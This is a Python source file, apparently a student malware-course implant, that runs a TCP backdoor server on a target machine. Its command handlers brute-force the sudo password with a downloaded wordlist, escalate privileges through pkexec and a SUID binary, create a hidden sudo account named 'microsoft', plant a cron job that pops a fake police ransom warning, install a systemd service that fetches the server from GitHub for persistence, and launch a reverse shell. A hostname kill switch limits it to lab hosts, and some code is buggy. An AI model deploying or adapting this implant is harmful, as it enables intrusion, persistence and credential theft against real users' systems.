#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import os
from urllib.request import urlopen

# listen on port 5050, receive inputs
HOST, PORT = "0.0.0.0", 5069

THIS_FILE = os.path.realpath(__file__)

"""
START OF NOT KILL SWITCH CODE
"""

AUTHORIZED_HOSTNAMES = ["e1-target.local", "e1-attack.local"]

def check_hostname_kill_switch():
    current_hostname = socket.gethostname()
    if current_hostname not in AUTHORIZED_HOSTNAMES:
        print(f"Kill switch triggered on unauthorized hostname: {current_hostname}")
        sys.exit(0)
    else:
        print(f"Hostname {current_hostname} is authorized. Continuing execution.")

"""
END OF NOT KILL SWITCH CODE-----------------------------------------------------
"""

"""
START OF NOT PASSWORD CRACKER CODE----------------------------------------------------
"""
def check_sudo_password(password: str) -> bool:
    # Attempt to run a simple sudo command with the given password
    print(password)
    try:
        # 'echo' just prints a message, we are looking to see if it succeeds without errors
        result = subprocess.run(['sudo', '-S', 'echo', 'test'], input=password, text=True, capture_output=True, timeout=5)
        
        # If sudo doesn't fail, the password is correct
        if result.returncode == 0:
            return True
        else:
            return False
    except subprocess.CalledProcessError:
        return False
    except subprocess.TimeoutExpired:
        return False
"""
END OF NOT PASSWORD CRACKER CODE----------------------------------------------------
"""

def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )




def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        import requests


def handle_conn(conn, addr):
    with conn:
        responsedata = "Command executed."
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        data = conn.recv(1024) 
        print("received: " + data.decode("utf-8", errors="replace"))

        if not data:
            return
    

        # Think VERY carefully about how you will communicate between the client and server
        # You will need to make a custom protocol to transfer commands
        
        if data.decode("utf-8", errors = "replace").split(" ")[0] == 'pexec':
            print("Debug: Executing pexec command")
            try:
                # Execute the pexec command
                result = subprocess.run(
                    ["pexec", "whoami"],  # Run the pexec whoami command
                    capture_output=True,
                    text=True,
                    env=os.environ.copy(),  # Pass current environment
                )
                response = result.stdout.strip()  # Capture and strip output
                print(f"Debug: Command output: {response}")  # Log command output
                print(f"Debug: Command error (stderr): {result.stderr.strip()}")  # Log stderr

                if not response:  # If no output from the command
                    response = "Error: Empty response from pexec command"
            except Exception as e:
                response = f"error: {e}"
                print(f"Debug: Exception occurred while executing pexec: {response}")

        if data.decode("utf-8",errors="replace").strip() =='PRIVESC':  
            subprocess.Popen(['pkexec', sys.executable, THIS_FILE])

        if data.decode("utf-8",errors="replace").strip() =='WHOAMI':  
            subprocess.run(['whoami'], capture_output=False)

        if data.decode("utf-8",errors="replace").strip() =='CRONTAB':
            os.remove('/var/spool/cron/crontabs/e1-target')
            with open('/var/spool/cron/crontabs/e1-target', 'w') as fp:
                fp.write('* * * * * env WAYLAND_DISPLAY=wayland-0 XDG_RUNTIME_DIR=/run/user/$(id -u) zenity --info --text="We tink u sir are responsible. Encripting fales. Call Kolkata police. " --title="WARNING: YOUR WANTED FOR CRIME')

        if data.decode("utf-8",errors="replace").strip() =='PASSCRACK': 
            print("HI") 
            LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
            ans = ""
            for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                if check_sudo_password(guess):
                    ans=guess
                    break;
            if ans=="":
                ans = "No password found."
            print(ans)
            conn.sendall(ans.encode)
                    

        if data.decode("utf-8",errors="replace").strip() =='HIDDENUSER':  #needs to be used after privlege escalationi, user is hidden until logged into for the first time
            c1 = "useradd -m -p $(perl -e 'print crypt($ARGV[0], \"password\")' 'password1') microsoft -u 499"
            c2 = "usermod -a -G sudo microsoft"
            subprocess.run(c1, shell=True)
            subprocess.run(c2, shell=True)
        
        if data.decode("utf-8",errors="replace").strip() =='SYSTEMD':
            with open("/etc/systemd/system/check-file.service", "w") as file1:
                
                string = """
                [Unit]
                Description=Check if a file exists on boot and download if possible
                After=network.target

                [Service]
                Type=oneshot
                ExecStart=/usr/local/bin/check-file.sh

                [Install]
                WantedBy=multi-user.target
                """
                file1.write(string)
            with open("/usr/local/bin/check-file.sh", "w") as file1:
                
                string = """
                #!/bin/bash

                if [ -f /path/to/file.txt ]; then
                    echo "File exists."
                else
                    curl -o server.py https://raw.githubusercontent.com/ucla-e1-malware/e1-malware-server/refs/heads/main/server.py
                    if [ $? -eq 0 ]; then
                        echo "File downloaded successfully to '$FILE'."
                    else
                        echo "Failed to download the file."
                    fi
                fi

                """
                file1.write(string)
            
            c1 = "sudo systemctl daemon-reload"
            c2 = "sudo systemctl enable check-file.service"

            subprocess.run(c1)
            subprocess.run(c2)
            

        if data.decode("utf-8",errors="replace").split(" ")[0] =='REVERSE_SHELL':
            process = subprocess.Popen(
                ['python3', 'reverse_shell.py', 'e1-target'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            input_data = data.decode("utf-8",errors="replace").split(" ")[1]
            process.stdin.write(f"{input_data}\n")
            process.stdin.flush()

            # Read the output line-by-line
            try:
                output_lines = []
                while True:
                    output = process.stdout.readline().strip()  # Read one line at a time
                    if not output:  # Break if no more output (EOF)
                        break
                    output_lines.append(output)
                    if (len(output_lines) == 3):
                        conn.sendall(output_lines[2].encode())
                        break
            except Exception as e:
                print(f"Error: {e}")
            finally:
                process.terminate()  # Ensure the process is cleaned up

        if data.decode("utf-8",errors="replace").strip() =='SUIDPEXEC':  
            
            result =  subprocess.run(
                        ["/usr/bin/pexec", 
                        "/bin/sh",
                        "-p",
                        "-c",
                        "whoami"],  # Run the command to an existing suid binary
                        capture_output=True,
                        text=True,
                        env=os.environ.copy(),  # Pass current environment
                    )
            response = result.stdout.strip()


        try:
            conn.sendall(response.encode())
            # Process the communication data from 
        except Exception as e:
            conn.sendall(f"error: {e}".encode())


def main():
    kill_others()
    bootstrap_packages()

    check_hostname_kill_switch() 

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                handle_conn(conn, addr)
                
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print("Connection died: {}".format(e))


if __name__ == "__main__":
    main()
